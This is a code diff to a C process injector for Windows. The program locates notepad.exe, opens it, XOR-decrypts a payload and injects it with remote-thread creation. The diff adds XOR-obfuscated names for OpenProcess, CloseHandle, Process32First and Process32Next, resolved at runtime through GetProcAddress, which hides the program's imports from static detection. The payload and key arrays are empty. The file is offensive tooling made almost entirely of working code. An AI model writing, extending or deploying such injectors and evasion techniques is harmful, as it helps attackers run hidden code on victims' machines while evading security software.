@@ -15,6 +15,10 @@ unsigned char s_vaex[] = { };
 unsigned char s_cth[] = { };
 unsigned char s_wfso[] = { };
 unsigned char s_wpm[] = { };
+unsigned char s_op[] = { };
+unsigned char s_clh[] = { };
+unsigned char s_p32f[] = { };
+unsigned char s_p32n[] = { };
 
 // length
 unsigned int my_payload_len = sizeof(my_payload);
@@ -22,6 +26,10 @@ unsigned int s_vaex_len = sizeof(s_vaex);
 unsigned int s_cth_len = sizeof(s_cth);
 unsigned int s_wfso_len = sizeof(s_wfso);
 unsigned int s_wpm_len = sizeof(s_wpm);
+unsigned int s_op_len = sizeof(s_op);
+unsigned int s_clh_len = sizeof(s_clh);
+unsigned int s_p32f_len = sizeof(s_p32f);
+unsigned int s_p32n_len = sizeof(s_p32n);
 
 char my_payload_key[] = "";
 char f_key[] = "";
@@ -44,6 +52,10 @@ BOOL (WINAPI * pWriteProcessMemory)(
   SIZE_T  nSize,
   SIZE_T  *lpNumberOfBytesWritten
 );
+HANDLE (WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
+BOOL (WINAPI * pCloseHandle)(HANDLE hObject);
+BOOL (WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
+BOOL (WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
 
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
     int j;
@@ -62,25 +74,31 @@ int FindTarget(const char *procname) {
         HANDLE hProcSnap;
         PROCESSENTRY32 pe32;
         int pid = 0;
-                
+
+        XOR((char *) s_p32f, s_p32f_len, f_key, sizeof(f_key));
+        pProcess32First = GetProcAddress(GetModuleHandle("kernel32.dll"), s_p32f);
+
+        XOR((char *) s_p32n, s_p32n_len, f_key, sizeof(f_key));
+        pProcess32Next = GetProcAddress(GetModuleHandle("kernel32.dll"), s_p32n);
+        
         hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                 
         pe32.dwSize = sizeof(PROCESSENTRY32); 
                 
-        if (!Process32First(hProcSnap, &pe32)) {
+        if (!pProcess32First(hProcSnap, &pe32)) {
                 CloseHandle(hProcSnap);
                 return 0;
         }
                 
-        while (Process32Next(hProcSnap, &pe32)) {
+        while (pProcess32Next(hProcSnap, &pe32)) {
                 if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                         pid = pe32.th32ProcessID;
                         break;
                 }
         }
                 
-        CloseHandle(hProcSnap);
+        pCloseHandle(hProcSnap);
                 
         return pid;
 }
@@ -112,7 +130,7 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
                 pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wfso);
                 pWaitForSingleObject(hThread, 500);
 
-                CloseHandle(hThread);
+                pCloseHandle(hThread);
                 return 0;
         }
         return -1;
@@ -124,20 +142,28 @@ int main(void) {
     int pid = 0;
     HANDLE hProc = NULL;
 
+    // decrypt CloseHandle function call
+    XOR((char *) s_clh, s_clh_len, f_key, sizeof(f_key));
+    pCloseHandle = GetProcAddress(GetModuleHandle("kernel32.dll"), s_clh);
+
     pid = FindTarget("notepad.exe");
 
     if (pid) {
         printf("Notepad.exe PID = %d\n", pid);
 
+        // decrypt OpenProcess function call
+        XOR((char *) s_op, s_op_len, f_key, sizeof(f_key));
+        pOpenProcess = GetProcAddress(GetModuleHandle("kernel32.dll"), s_op);
+
         // try to open target process
-        hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+        hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                         PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                         FALSE, (DWORD) pid);
 
         if (hProc != NULL) {
             XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
             Inject(hProc, my_payload, my_payload_len);
-            CloseHandle(hProc);
+            pCloseHandle(hProc);
         }
     }
     return 0;
